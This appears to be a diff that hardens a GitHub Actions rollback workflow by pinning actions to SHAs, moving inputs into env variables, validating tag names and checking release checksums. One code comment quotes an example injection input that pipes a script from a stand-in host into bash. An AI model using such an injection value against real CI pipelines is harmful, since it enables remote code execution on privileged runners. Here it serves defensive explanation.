@@ -21,7 +21,7 @@ jobs:
     runs-on: ubuntu-latest
     environment: production  # Requires same approval as prod deploy
     steps:
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
         with:
           fetch-depth: 0
 
@@ -29,10 +29,22 @@ jobs:
         id: target
         env:
           GH_TOKEN: ${{ github.token }}
+          # Via `env`, never interpolated into the script body. `${{ }}` is
+          # expanded by the Actions templater *before* bash sees the line, so a
+          # dispatch input like `x"; curl evil.sh | bash; #` would execute on a
+          # runner holding `contents: write`. Quoting "$INPUT_VERSION" instead
+          # means bash treats it as data.
+          INPUT_VERSION: ${{ inputs.version }}
         run: |
-          if [ -n "${{ inputs.version }}" ]; then
-            # Revert to specific version
-            TARGET_TAG="${{ inputs.version }}"
+          if [ -n "$INPUT_VERSION" ]; then
+            # Revert to a specific version. Validate the shape before it reaches
+            # `git rev-parse` or a `gh` call: a tag name is `vX.Y.Z`, optionally
+            # with the `+YYYYMMDD` suffix prod adds on a same-version rebuild.
+            if ! printf '%s' "$INPUT_VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(\+[0-9]{8})?$'; then
+              echo "ERROR: '$INPUT_VERSION' is not a valid version tag (expected vX.Y.Z)."
+              exit 1
+            fi
+            TARGET_TAG="$INPUT_VERSION"
             echo "Reverting to specified version: $TARGET_TAG"
           else
             # Find the previous prod release: versioned (vX.Y.Z) stable
@@ -64,13 +76,24 @@ jobs:
       - name: Download release binaries
         env:
           GH_TOKEN: ${{ github.token }}
+          TARGET_TAG: ${{ steps.target.outputs.tag }}
         run: |
           mkdir -p release/
-          gh release download ${{ steps.target.outputs.tag }} --dir release/ 2>/dev/null || {
-            echo "ERROR: Could not download binaries for ${{ steps.target.outputs.tag }}"
+          gh release download "$TARGET_TAG" --dir release/ 2>/dev/null || {
+            echo "ERROR: Could not download binaries for $TARGET_TAG"
             exit 1
           }
           ls -la release/
+
+          # Verify the checksums that ship alongside the binaries before they are
+          # republished as `latest`. Without this the file travels as decoration:
+          # a tampered asset would be promoted with its stale checksum next to it.
+          if [ -f release/SHA256SUMS ]; then
+            (cd release && grep -v '^SHA256SUMS$' SHA256SUMS | sha256sum -c -)
+          else
+            echo "ERROR: no SHA256SUMS in $TARGET_TAG — refusing to republish unverified binaries."
+            exit 1
+          fi
 
       # Rebuild the rolling 'latest' channel release from the target
       # version's assets. Same delete-release-and-tag-together pattern as
@@ -82,7 +105,7 @@ jobs:
         run: gh release delete latest --yes --cleanup-tag --repo ${{ github.repository }} || true
 
       - name: Publish reverted release
-        uses: softprops/action-gh-release@v3
+        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3
         with:
           tag_name: latest
           target_commitish: ${{ steps.target.outputs.sha }}
